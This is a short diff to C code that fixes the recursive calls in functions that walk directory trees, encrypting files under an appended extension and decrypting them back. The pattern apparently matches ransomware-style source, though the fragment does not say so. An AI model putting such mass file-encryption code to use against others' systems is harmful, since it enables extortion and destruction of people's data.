@@ -47,7 +47,7 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
     while ((dir = readdir(dr)) != NULL) {
         if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ext) == NULL) {
             toVisit = linkStr(path, dir->d_name, 1);
-            if (begin_encrypt(toVisit) == 0) {
+            if (begin_encrypt(channel, toVisit, key, iv) == 0) {
                 newName = linkStr(toVisit, ext, 0);
                 old = fopen(toVisit, "rb");
                 newone = fopen(newName, "wb");
@@ -85,7 +85,7 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
     while ((dir = readdir(dr)) != NULL) {
         if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
             toVisit = linkStr(path, dir->d_name, 1);
-            if (begin_decrypt(toVisit) == 0) {
+            if (begin_decrypt(channel, toVisit, key, iv) == 0) {
                 newName = removeLastChars(toVisit, strlen(ext));
                 old = fopen(toVisit, "rb");
                 newone = fopen(newName, "wb");
